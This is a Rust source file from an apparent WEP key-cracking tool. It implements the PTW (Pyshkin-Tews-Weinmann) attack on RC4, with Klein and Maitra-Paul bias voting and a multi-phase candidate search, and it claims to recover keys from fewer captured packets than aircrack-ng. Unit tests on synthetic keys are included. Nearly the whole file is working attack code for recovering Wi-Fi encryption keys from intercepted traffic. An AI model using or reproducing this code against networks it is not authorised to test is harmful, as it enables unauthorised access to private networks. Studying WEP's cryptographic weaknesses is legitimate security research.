//! The PTW attack (FR-ATK-PTW-1): Pyshkin-Tews-Weinmann, built on Klein's RC4 analysis.
//!
//! Unlike FMS it uses *every* packet with enough known keystream (typically ARP, whose plaintext is known), so it cracks ordinary captured traffic rather than only weak IVs.
//!
//! Per packet we run the KSA over the 3 IV octets, then for each position vote for the cumulative key sum `sigma_i = K[3] + .. + K[3+i] = Sinv[(3+i) - keystream[2+i]] - j - sum(state[3..=3+i])`. Votes accumulate; the per-position argmax gives `sigma_i`, and the secret octets are the consecutive differences `K[3+i] = sigma_i - sigma_(i-1)`. Ported from aircrack-ng's `guesskeybytes` (`lib/ptw/aircrack-ptw-lib.c`, C5).
#![allow(
    clippy::indexing_slicing,
    clippy::cast_possible_truncation,
    reason = "byte-permute KSA over a 256-octet state indexed by u8-derived values in range by construction"
)]

use super::Attack;
use crate::model::{BssidWep, IvSample, KeyLen, WepKey};
use crate::wep::Verifier;

/// The PTW statistical attack with aircrack-style last-keybyte bruteforce.
#[derive(Debug, Clone, Copy, Default)]
pub struct PtwAttack {
    /// Candidate-search tuning; PTW uses `brute_tail` (`-x`) to sweep the weak
    /// trailing octets. (`-f`/`-c` shape the KoreK/bias votes, not PTW's.)
    pub tuning: super::Tuning,
}

impl Attack for PtwAttack {
    fn name(&self) -> &'static str {
        "ptw"
    }

    fn applicable(&self, bssid: &BssidWep, len: KeyLen) -> bool {
        super::unique_iv_count(bssid) >= super::min_samples(len)
    }

    fn run(&self, bssid: &BssidWep, len: KeyLen, verifier: &Verifier) -> Option<WepKey> {
        // Every data frame's SNAP keystream feeds PTW; ARP/IP frames add longer ones.
        recover(bssid.ivs(), bssid.arp_keystreams(), len.byte_len(), verifier, self.tuning.brute_tail, W_MP)
    }
}

/// Klein vote weight in the combined tally. Klein's correlation holds with
/// p ~ 1.36/N (Klein, DCC 2008), so its useful signal over the 1/N floor is
/// ~0.36/N; the weight is proportional to that so the two biases combine
/// optimally ([Sepehrdad-Vaudenay-Vuagnoux, FSE 2013] §7, the a_opt coefficient).
const W_KLEIN: i32 = 13;
/// Maitra-Paul vote weight. MP holds with p ~ 1.11/N ([Sepehrdad et al., SAC
/// 2010] Eq. 16), so its signal over the floor is ~0.11/N -- about 4/13 of
/// Klein's, which sets the 13:4 ratio. aircrack-ng's PTW votes Klein only, so
/// this is the extra per-packet signal that drops the packets-needed below it.
pub(crate) const W_MP: i32 = 4;

/// Tally the Klein + Maitra-Paul sigma votes, then search the top candidates per
/// position (differenced into key octets) for the first key the verifier accepts.
/// The search tries the argmax key first, so a clean signal cracks immediately.
/// Shared with [`crate::attack::ska`], which runs the same vote over the pool that
/// includes the harvested shared-key-auth keystream.
pub(crate) fn recover(
    primary: &[IvSample],
    secondary: &[IvSample],
    keylen: usize,
    verifier: &Verifier,
    brute_tail: usize,
    mp_weight: i32,
) -> Option<WepKey> {
    // Tally over distinct IVs only -- a reused IV repeats the same sigma vote and
    // would bias the table (aircrack keeps unique IVs, C5).
    let samples = super::unique_samples(primary, secondary);
    let mut table = vec![[0i32; 256]; keylen];
    for sample in &samples {
        let keystream = sample.keystream();
        // Need keystream octets [0 ..= keylen+1] to vote on all secret octets.
        if keystream.len() < keylen + 2 {
            continue;
        }
        accumulate_votes(sample.iv, keystream, mp_weight, sample.df_index, &mut table);
    }
    search_sigma_table(&table, verifier, brute_tail)
}

/// Search a populated per-position cumulative-sum ("sigma") vote table for the
/// first key the verifier accepts (C4). Shared by PTW and the Sepehrdad bias
/// database (`crate::attack::bias`): both estimate the same cumulative key sum
/// `Kbar[i] = K[0] + .. + K[i]` per position, so both produce this table and reuse
/// the identical three-phase search. `table.len()` is the hypothesised key length.
pub(crate) fn search_sigma_table(table: &[[i32; 256]], verifier: &Verifier, brute_tail: usize) -> Option<WepKey> {
    let keylen = table.len();
    // Phase 1: rank-based top-k backtracking over every position (last octet
    // included). PTW's sigma votes are near-uniform -- the Klein bias lifts the
    // true value only ~36% over a ~N/256 floor -- so a ratio-fudge would keep
    // nearly everything; top-k is the right cut. This cracks captures whose every
    // octet's vote is strong, the usual case, with no exhaustive tail. The budget
    // only bites when the key-length hypothesis is wrong (every length but the
    // true one is tried in the sweep), so a hopeless length abandons quickly.
    let ranked = ranked_candidates(table);
    let topk =
        ranked.iter().map(|idx| idx.iter().copied().take(top_k(keylen)).collect::<Vec<u8>>()).collect::<Vec<_>>();
    let mut budget: u32 = 1 << 17;
    if let Some(found) = search(&topk, &mut vec![0u8; keylen], 0, 0, verifier, &mut budget) {
        return Some(found);
    }
    // Phase 2: aircrack's last-keybyte bruteforce. The final octet's Klein bias is
    // the weakest of all and routinely ranks past k, so Phase 1 misses keys that
    // are otherwise clean (e.g. a replayed-ARP WEP-104 capture). Pin the confident
    // early octets at their argmax and sweep the trailing `brute_tail` octets
    // exhaustively. O(256^brute_tail) -- bounded regardless of key length, so it
    // adds only ~256 verifies, never an explosion.
    let tail = brute_tail.clamp(1, keylen);
    let swept: Vec<Vec<u8>> = ranked
        .iter()
        .enumerate()
        .map(|(pos, idx)| if pos + tail < keylen { vec![idx[0]] } else { idx.clone() })
        .collect();
    let mut budget: u32 = 1 << 17;
    if let Some(found) = search(&swept, &mut vec![0u8; keylen], 0, 0, verifier, &mut budget) {
        return Some(found);
    }
    // The quick pass stops here: Phases 1-2 are both cheap (top-k plus a single
    // trailing-octet sweep) and crack the common case, including ASCII WEP-104
    // keys whose last octet votes weakly. The expensive Phase 3 ladder below runs
    // only in the full pass, so the true key length's cheap crack is reached before
    // any wrong length's costly backtracking (FR-PERF-3).
    if super::quick() {
        return None;
    }
    // Phase 3a: Polya / global-margin adaptive depth allocation. Give each
    // position a candidate-search depth set by how *uncertain* its vote is, bounded
    // by a total key-test budget: confident octets stay at their argmax, while flat
    // octets -- a "strong" key byte whose Klein bias vanishes (the RC4 KSA-carry
    // case), or an unknown IPv4-ID octet -- get many candidates. This is
    // aircrack-ng's global candidate expansion and the practical form of the
    // Smashing-WEP Polya rank model ([Sepehrdad et al., FSE 2013] §7.1): the
    // correct candidate's rank has variance >> mean, so search depth is allocated
    // to the least-confident positions rather than uniformly. One shaped search
    // adapts to each capture instead of fixed rungs.
    let depths = adaptive_depths(table, &ranked, ADAPTIVE_KEY_BUDGET);
    let candidates: Vec<Vec<u8>> =
        ranked.iter().enumerate().map(|(pos, idx)| idx.iter().copied().take(depths[pos]).collect()).collect();
    let mut budget: u32 = 1 << 24;
    if let Some(found) = search(&candidates, &mut vec![0u8; keylen], 0, 0, verifier, &mut budget) {
        return Some(found);
    }
    // Phase 3b: a fixed coarse ladder, kept as a fallback for shapes the adaptive
    // allocation's single budget split does not reach. Two regimes are covered:
    //   * real passive IP traffic leaves *interior* octets unknown -- the IPv4
    //     Identification field is unpredictable, so its positions vote pure noise
    //     and their true value sits at a random rank -> the (2, 256) rung sweeps
    //     them fully (aircrack-ng brute-forces these same IP-ID sigmas);
    //   * a marginal-packet capture has several octets mis-ranked by a few places
    //     -> the wider, shallower rungs reach them.
    // Each rung's leaf count `depth^width` stays under the node budget, so the
    // true combination is always reachable; the per-BSSID deadline still bounds
    // wall-clock. Only reached when the clean paths fail, so an ordinary crack is
    // never slowed. Mirrors aircrack-ng's candidate expansion, bounded for the
    // passive offline setting (C5).
    let margins = vote_margins(table, &ranked);
    let mut order: Vec<usize> = (0..keylen).collect();
    order.sort_by_key(|&pos| margins[pos]);
    for &(width, depth) in &SWEEP_LADDER {
        let sweep = order.get(..width.min(keylen)).unwrap_or(&order);
        let candidates: Vec<Vec<u8>> = ranked
            .iter()
            .enumerate()
            .map(
                |(pos, idx)| {
                    if sweep.contains(&pos) { idx.iter().copied().take(depth).collect() } else { vec![idx[0]] }
                },
            )
            .collect();
        let mut budget: u32 = SWEEP_BUDGET;
        if let Some(found) = search(&candidates, &mut vec![0u8; keylen], 0, 0, verifier, &mut budget) {
            return Some(found);
        }
    }
    None
}

/// The Phase-3 search ladder: `(positions swept, candidate depth each)`, weakest
/// positions first. `(2, 256)` covers the pair of fully-unknown IP-ID octets (the
/// passive-IP case); the wider, shallower rungs cover three to six moderately
/// mis-ranked octets (the marginal-packet case). Each rung's `depth^width` leaf
/// count stays well under [`SWEEP_BUDGET`] so the true combination is reachable.
const SWEEP_LADDER: [(usize, usize); 5] = [(2, 256), (3, 64), (4, 24), (5, 13), (6, 8)];

/// Node budget per ladder rung. Sized above the largest rung's node count (leaves
/// times the unary tail, ~5M) so a rung is explored fully rather than truncated;
/// the per-BSSID deadline (FR-PERF-3) is the real wall-clock bound in production.
const SWEEP_BUDGET: u32 = 1 << 23;

/// Key-test budget for the adaptive (Polya / global-margin) search: the product
/// of per-position candidate depths is held under this, bounding the leaf count
/// so the true key stays reachable. ~10^6, matching aircrack-ng's key limit.
const ADAPTIVE_KEY_BUDGET: u64 = 1 << 20;

/// Allocate a per-position candidate-search depth by vote uncertainty, bounded by
/// `budget` (the product of depths). Implements aircrack-ng's global candidate
/// expansion: repeatedly admit the next-cheapest deviation -- the candidate with
/// the smallest vote gap below some position's top -- deepening that position by
/// one, until the product reaches `budget`. Flat (uncertain) positions accumulate
/// depth first; confident positions stay at depth 1 (argmax only). This realises
/// the Smashing-WEP Polya rank model in practice (search where the correct
/// candidate is likely to be deep), and handles strong key bytes (flat votes) and
/// unknown IP-ID octets without special-casing.
fn adaptive_depths(table: &[[i32; 256]], ranked: &[Vec<u8>], budget: u64) -> Vec<usize> {
    let mut depth = vec![1usize; table.len()];
    // Every non-top candidate as (vote gap below this position's top, position).
    let mut deviations: Vec<(i32, usize)> = Vec::new();
    for (pos, idx) in ranked.iter().enumerate() {
        let top = idx.first().map_or(0, |&i| table[pos][usize::from(i)]);
        for &cand in idx.iter().skip(1) {
            deviations.push((top.saturating_sub(table[pos][usize::from(cand)]), pos));
        }
    }
    deviations.sort_unstable_by_key(|&(gap, _)| gap); // flattest deviations first
    let mut product = 1u64;
    for (_, pos) in deviations {
        let grown = product / depth[pos] as u64 * (depth[pos] as u64 + 1);
        if grown > budget {
            continue; // deepening this octet would exceed the budget; skip it
        }
        depth[pos] += 1;
        product = grown;
        if product >= budget {
            break;
        }
    }
    depth
}

/// Per-position vote decisiveness: the margin between the top two sigma
/// candidates. A confident position (clean known plaintext) has a large margin;
/// a position fed by unknown plaintext votes near-uniformly, so its margin is
/// tiny -- which is how Phase 3 finds the positions worth sweeping.
fn vote_margins(table: &[[i32; 256]], ranked: &[Vec<u8>]) -> Vec<i32> {
    table
        .iter()
        .zip(ranked)
        .map(|(votes, idx)| {
            let top = idx.first().map_or(0, |&i| votes[usize::from(i)]);
            let second = idx.get(1).map_or(0, |&i| votes[usize::from(i)]);
            top.saturating_sub(second)
        })
        .collect()
}

/// The fudge factor (top-`k` width) per key length: WEP-40's sigma votes are the
/// noisiest and want a wide net; longer keys have proportionally cleaner votes.
const fn top_k(keylen: usize) -> usize {
    match keylen {
        0..=5 => 13,
        6..=13 => 3,
        _ => 1,
    }
}

/// Every octet value per position, sorted most-voted first.
fn ranked_candidates(table: &[[i32; 256]]) -> Vec<Vec<u8>> {
    table
        .iter()
        .map(|votes| {
            let mut idx: Vec<u8> = (0..=255).collect();
            idx.sort_unstable_by(|&a, &b| votes[usize::from(b)].cmp(&votes[usize::from(a)]));
            idx
        })
        .collect()
}

/// Depth-first search over the sigma candidates for the first key the verifier
/// accepts. `prev` is sigma_(pos-1); the octet at `pos` is `sigma - prev`.
fn search(
    candidates: &[Vec<u8>],
    key: &mut [u8],
    pos: usize,
    prev: u8,
    verifier: &Verifier,
    budget: &mut u32,
) -> Option<WepKey> {
    if *budget == 0 || super::deadline_passed() {
        return None;
    }
    *budget -= 1;
    let Some(level) = candidates.get(pos) else {
        let candidate = WepKey::new(key)?;
        return verifier.accept(&candidate).then_some(candidate);
    };
    for &sigma in level {
        if let Some(slot) = key.get_mut(pos) {
            *slot = sigma.wrapping_sub(prev);
        }
        if let Some(found) = search(candidates, key, pos + 1, sigma, verifier, budget) {
            return Some(found);
        }
    }
    None
}

/// Cast the Klein and Maitra-Paul votes from one packet into `table`.
///
/// Both biases estimate the *same* cumulative key sum `sigma_i = K[0] + .. + K[i]`
/// ([Sepehrdad-Vaudenay-Vuagnoux, FSE 2013] Table 1, the "Klein-Improved" and
/// "MP-Improved" rows: `f = S_t^-1[i - z_i] - sigma_i(t)` and `f = z_{i+1} -
/// sigma_i(t)`). They share the `sigma_i(t)` term (here `j + sigma`); the only
/// difference is the keystream octet read: Klein reads `z_i` (octet `2+i`),
/// Maitra-Paul the *next* octet `z_{i+1}` (octet `3+i`). Voting both into one
/// table gives two independent estimates per packet, where aircrack-ng's PTW
/// votes Klein alone -- so the table converges from fewer packets (C5). `t = 2`:
/// the KSA is simulated over the 3 clear IV octets only.
fn accumulate_votes(iv: [u8; 3], keystream: &[u8], mp_weight: i32, df: Option<u8>, table: &mut [[i32; 256]]) {
    // KSA over the 3 IV octets only, recording j after each round for MP's guard.
    let mut state: [u8; 256] = core::array::from_fn(|i| i as u8);
    let mut j = 0u8;
    let mut j_hist = [0u8; 3];
    for i in 0..3 {
        j = j.wrapping_add(state[i]).wrapping_add(iv[i]);
        state.swap(i, usize::from(j));
        j_hist[i] = j;
    }
    // The Klein candidate for keystream octet `z` read at RC4 position `jj`.
    let klein_cand = |jj: usize, sigma: u8, z: u8| -> u8 {
        let tmp = (jj as u8).wrapping_sub(z);
        let sinv = state.iter().position(|&v| v == tmp).unwrap_or(0) as u8;
        sinv.wrapping_sub(j).wrapping_sub(sigma)
    };
    // One vote per key position; `table.len()` is the key length the caller sized.
    let mut sigma = 0u8;
    for (i, row) in table.iter_mut().enumerate() {
        let jj = 3 + i;
        sigma = sigma.wrapping_add(state[jj]); // sigma_i(t) = j + this running sum
        // Klein: z_i = keystream[jj-1]; guaranteed present by the caller's length
        // guard. Estimate = S_t^-1[(3+i) - z_i] - sigma_i(t).
        row[usize::from(klein_cand(jj, sigma, keystream[jj - 1]))] += W_KLEIN;
        // Two-keystream IPv4 voting (FR-ATK-PTW-1): if the IPv4 Don't-Fragment octet
        // (dual-valued 0x40 / 0x00) feeds this Klein vote, also vote the alternative
        // keystream value, weighted by the observed DF split (36/220 of the primary,
        // mirroring aircrack-ng's `known_clear`). So the octet votes right whatever
        // the frame's DF state, instead of being wrong on the ~15% DF-clear frames.
        if df == Some((jj - 1) as u8) {
            let alt = klein_cand(jj, sigma, keystream[jj - 1] ^ 0x40);
            row[usize::from(alt)] += (W_KLEIN * 36) / 220;
        }
        // Maitra-Paul: z_{i+1} = keystream[jj]; estimate = z_{i+1} - sigma_i(t).
        // Gated by g (Table 1): z_{i+1} >= i (paper index 3+i) and z_{i+1} was not
        // a KSA j value -- the conditions under which MP's p ~ 1.11/N holds.
        if mp_weight > 0
            && let Some(&zmp) = keystream.get(jj)
            && zmp >= jj as u8
            && j_hist.iter().all(|&jh| jh != zmp)
        {
            row[usize::from(zmp.wrapping_sub(j).wrapping_sub(sigma))] += mp_weight;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::{PtwAttack, W_MP, recover};
    use crate::attack::Attack;
    use crate::crypto::{Rc4, crc32};
    use crate::model::{BssidWep, EncFrame, IvSample, KeyLen, WepKey};
    use crate::wep::Verifier;

    /// Generate `n` samples with counter IVs and the true 16-octet keystream
    /// (what the ARP harvest yields), for a known key.
    fn arp_samples(key: &[u8], n: u32) -> Vec<IvSample> {
        (0..n)
            .map(|c| {
                let iv = [c as u8, (c >> 8) as u8, (c >> 16) as u8];
                let mut seed = iv.to_vec();
                seed.extend_from_slice(key);
                let mut ks = [0u8; 16];
                Rc4::new(&seed).keystream(&mut ks);
                IvSample::new(iv, &ks)
            })
            .collect()
    }

    fn verifier_for(key: &[u8]) -> Verifier {
        let frames = [[1u8, 2, 3], [4, 5, 6]]
            .iter()
            .map(|iv| {
                let plain = b"\xaa\xaa\x03\x00\x00\x00 verifier frame body";
                let mut data = plain.to_vec();
                data.extend_from_slice(&crc32(plain).to_le_bytes());
                let mut seed = iv.to_vec();
                seed.extend_from_slice(key);
                Rc4::new(&seed).apply_keystream(&mut data);
                EncFrame { iv: *iv, data, key_id: 0 }
            })
            .collect();
        Verifier::new(frames)
    }

    #[test]
    fn ptw_recovers_wep40() {
        let key = [0x11u8, 0x22, 0x33, 0x44, 0x55];
        // PTW's Klein bias plus the candidate search recovers a WEP-40 key.
        let recovered = recover(&arp_samples(&key, 80_000), &[], 5, &verifier_for(&key), 1, W_MP);
        assert_eq!(recovered.as_ref().map(WepKey::as_slice), Some(key.as_slice()));
    }

    #[test]
    fn ptw_end_to_end_via_attack() {
        let key = [0xde_u8, 0xad, 0xbe, 0xef, 0x01];
        let bssid = BssidWep::with_material(crate::model::WepMaterial {
            arp_keystreams: arp_samples(&key, 80_000),
            ..Default::default()
        });
        let recovered = PtwAttack::default().run(&bssid, KeyLen::Wep40, &verifier_for(&key));
        assert_eq!(recovered.as_ref().map(WepKey::as_slice), Some(key.as_slice()));
    }

    /// WEP-104 samples modelling *real passive IP traffic*: the known plaintext is
    /// correct everywhere except the two octets the harvester reconstructs from a
    /// guessed IPv4 Identification field (assumed `0x0000`). Real traffic carries
    /// a varying ID, so the recovered keystream at indices 12 and 13 is wrong --
    /// which makes the Klein votes for the *interior* key positions 10 and 11 pure
    /// noise. ARP-replay corpora never exercise this (ARP has a fully-known
    /// header), and it is exactly where aircrack-ng's sigma-bruteforce of the
    /// unrecoverable IP fields cracks and a plain top-k + trailing brute does not.
    fn ip_samples_unknown_id(key: &[u8], n: u32) -> Vec<IvSample> {
        (0..n)
            .map(|c| {
                let iv = [c as u8, (c >> 8) as u8, (c >> 16) as u8];
                let mut seed = iv.to_vec();
                seed.extend_from_slice(key);
                let mut ks = [0u8; 16];
                Rc4::new(&seed).keystream(&mut ks);
                // The harvester XORs the ciphertext against an assumed IP-ID of
                // 0x0000; a real, varying ID corrupts exactly these two octets.
                ks[12] ^= (c.wrapping_mul(2_654_435_761) >> 13) as u8;
                ks[13] ^= (c.wrapping_mul(2_246_822_519) >> 7) as u8;
                IvSample::new(iv, &ks)
            })
            .collect()
    }

    /// WEP-104 IP samples with a *mixed* DF state: ~1 in 7 frames is DF-clear, so
    /// the harvester (which assumes DF set, 0x40) mis-recovers the DF keystream
    /// octet (index 14) by 0x40 on those. Marked `new_ip` so the two-keystream vote
    /// recovers the octet either way.
    fn ip_samples_mixed_df(key: &[u8], n: u32) -> Vec<IvSample> {
        (0..n)
            .map(|c| {
                let iv = [c as u8, (c >> 8) as u8, (c >> 16) as u8];
                let mut seed = iv.to_vec();
                seed.extend_from_slice(key);
                let mut ks = [0u8; 16];
                Rc4::new(&seed).keystream(&mut ks);
                if c % 7 == 0 {
                    ks[14] ^= 0x40; // a DF-clear frame mis-recovered under the DF-set guess
                }
                IvSample::new_ip(iv, &ks, 14)
            })
            .collect()
    }

    #[test]
    fn ptw_recovers_wep104_mixed_df_ip() {
        // Two-keystream IPv4 voting (FR-ATK-PTW-1): the DF octet is voted both ways,
        // so a capture mixing DF-set and DF-clear frames still recovers.
        let key = [0xAEu8, 0x5B, 0x7F, 0x3A, 0x03, 0xD0, 0xAF, 0x9B, 0xF6, 0x8D, 0xA5, 0xE2, 0xC7];
        let recovered = recover(&[], &ip_samples_mixed_df(&key, 80_000), 13, &verifier_for(&key), 1, W_MP);
        assert_eq!(recovered.as_ref().map(WepKey::as_slice), Some(key.as_slice()));
    }

    #[test]
    fn ptw_recovers_wep104_real_ip_traffic() {
        // The two interior positions fed by the unknown IPv4 ID (10 and 11) carry
        // no usable vote, so the top-k backtrack and the trailing-octet brute both
        // miss them; the adaptive weakest-byte sweep is what recovers the key.
        let key = [0xAEu8, 0x5B, 0x7F, 0x3A, 0x03, 0xD0, 0xAF, 0x9B, 0xF6, 0x8D, 0xA5, 0xE2, 0xC7];
        let recovered = recover(&[], &ip_samples_unknown_id(&key, 100_000), 13, &verifier_for(&key), 1, W_MP);
        assert_eq!(recovered.as_ref().map(WepKey::as_slice), Some(key.as_slice()));
    }

    /// A deterministic 13-octet key from a seed (no rng in tests).
    fn wep104_key(seed: u8) -> [u8; 13] {
        let mut key = [0u8; 13];
        let mut acc = seed;
        for k in &mut key {
            acc = acc.wrapping_mul(73).wrapping_add(41);
            *k = acc;
        }
        key
    }

    #[test]
    fn ptw_recovers_wep104_from_marginal_capture() {
        // The adaptive margin-ranked ladder recovers WEP-104 from ~50k clean ARP
        // packets. Before the ladder (a fixed top-3 backtrack plus a two-octet
        // sweep) this key needed ~80k; the ladder reaching several moderately
        // mis-ranked octets is what lowers the count into aircrack-ng's range.
        let key = wep104_key(0x3F);
        let recovered = recover(&[], &arp_samples(&key, 50_000), 13, &verifier_for(&key), 1, W_MP);
        assert_eq!(recovered.as_ref().map(WepKey::as_slice), Some(key.as_slice()));
    }

    #[test]
    fn mp_vote_tips_an_end_to_end_recovery() {
        // The headline "fewer packets than aircrack-ng" case, end to end: from one
        // fixed 40k-packet WEP-104 capture, the Klein-only vote aircrack-ng's PTW
        // uses does not yield a recoverable key, but adding the Maitra-Paul second
        // vote does -- same packets, same search, one extra bias over the line.
        let key = wep104_key(0xAE);
        let samples = arp_samples(&key, 40_000);
        let verifier = verifier_for(&key);
        assert!(
            recover(&[], &samples, 13, &verifier, 1, 0).is_none(),
            "Klein-only (aircrack's PTW) should not recover from these 40k packets",
        );
        let recovered = recover(&[], &samples, 13, &verifier, 1, W_MP);
        assert_eq!(recovered.as_ref().map(WepKey::as_slice), Some(key.as_slice()));
    }

    #[test]
    fn adaptive_depths_target_uncertain_positions() {
        // Position 0 has a decisive vote (one clear winner); position 1 is flat (a
        // strong key byte or unknown octet, no winner). The Polya / global-margin
        // allocation must spend its budget on the flat position and leave the
        // confident one at its argmax.
        let mut table = vec![[0i32; 256]; 2];
        table[0][7] = 1000; // confident: value 7 dominates
        table[1] = [100i32; 256]; // flat: every value tied
        let ranked = super::ranked_candidates(&table);
        let depths = super::adaptive_depths(&table, &ranked, 256);
        assert_eq!(depths[0], 1, "confident position stays at argmax");
        assert!(depths[1] > 1, "flat position gets deeper search (got {})", depths[1]);
    }

    #[test]
    fn quick_pass_skips_the_expensive_ladder() {
        // The engine sweeps each BSSID with a quick pass (cheap Phases 1-2 only)
        // before the full pass (adds the Phase 3 ladder), so a wrong key length's
        // ladder cannot starve the true length's cheap crack. Verify the split: a
        // capture that needs the ladder (real IP traffic, two unknown interior
        // octets) is recovered only when not in the quick pass.
        let key = [0xAEu8, 0x5B, 0x7F, 0x3A, 0x03, 0xD0, 0xAF, 0x9B, 0xF6, 0x8D, 0xA5, 0xE2, 0xC7];
        let mut table = vec![[0i32; 256]; 13];
        for s in &ip_samples_unknown_id(&key, 100_000) {
            super::accumulate_votes(s.iv, s.keystream(), W_MP, s.df_index, &mut table);
        }
        let verifier = verifier_for(&key);
        crate::attack::set_quick(true);
        let quick = super::search_sigma_table(&table, &verifier, 1);
        crate::attack::set_quick(false);
        let full = super::search_sigma_table(&table, &verifier, 1);
        assert!(quick.is_none(), "quick pass must stop before the Phase 3 ladder");
        assert_eq!(full.as_ref().map(WepKey::as_slice), Some(key.as_slice()), "full pass recovers via the ladder");
    }

    #[test]
    fn mp_vote_outperforms_klein_only() {
        // The "better than aircrack-ng" property, measured directly on the votes.
        // aircrack-ng's PTW votes Klein alone (mp_weight = 0); WEPWolf adds the
        // Maitra-Paul second vote (mp_weight = W_MP). Over a deterministic spread
        // of WEP-104 keys at a marginal packet count, count how often the true
        // cumulative sum is NOT the top-voted candidate -- the octets a recovery
        // search then has to fix. Fewer mis-ranked octets => recovery from fewer
        // packets. The two biases share the table because both estimate the same
        // sigma_i (FSE 2013 Table 1), so MP is pure added signal.
        use super::accumulate_votes;
        let n = 25_000u32;
        let trials = 24u32;
        let (mut wrong_klein, mut wrong_both) = (0u32, 0u32);
        for t in 0..trials {
            // Deterministic pseudo-random 13-octet key per trial (no rng in tests).
            let mut key = [0u8; 13];
            let mut x = t.wrapping_mul(2_654_435_761).wrapping_add(12_345);
            for k in &mut key {
                x = x.wrapping_mul(1_103_515_245).wrapping_add(12_345);
                *k = (x >> 16) as u8;
            }
            let mut truth = [0u8; 13];
            let mut acc = 0u8;
            for (i, &k) in key.iter().enumerate() {
                acc = acc.wrapping_add(k);
                truth[i] = acc;
            }
            let samples = arp_samples(&key, n);
            for (w, total) in [(0i32, &mut wrong_klein), (W_MP, &mut wrong_both)] {
                let mut table = vec![[0i32; 256]; 13];
                for s in &samples {
                    accumulate_votes(s.iv, s.keystream(), w, s.df_index, &mut table);
                }
                for (i, &want) in truth.iter().enumerate() {
                    let tv = table[i][usize::from(want)];
                    if table[i].iter().any(|&v| v > tv) {
                        *total += 1;
                    }
                }
            }
        }
        // Adding the Maitra-Paul vote strictly reduces the mis-ranked octet count
        // (deterministic inputs: 136 -> 123 at the time of writing).
        assert!(
            wrong_both < wrong_klein,
            "Klein+MP must mis-rank fewer octets than aircrack's Klein-only PTW (klein={wrong_klein}, klein+mp={wrong_both})",
        );
    }
}
